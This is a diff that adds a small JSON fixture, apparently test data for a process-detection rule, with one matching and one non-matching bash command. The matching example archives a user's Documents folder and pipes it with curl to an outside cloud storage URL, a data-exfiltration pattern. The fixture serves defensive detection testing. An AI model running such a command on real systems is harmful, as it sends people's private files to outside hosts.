@@ -1,0 +1,10 @@
+{
+  "matching": {
+    "image": "/usr/bin/bash",
+    "cmdline": "bash -c tar -czf - /home/alice/Documents | curl -T - https://storage.googleapis.com/acme/home.tar.gz"
+  },
+  "non_matching": {
+    "image": "/usr/bin/bash",
+    "cmdline": "bash -c tar -czf /tmp/home.tar.gz /home/alice/Documents"
+  }
+}
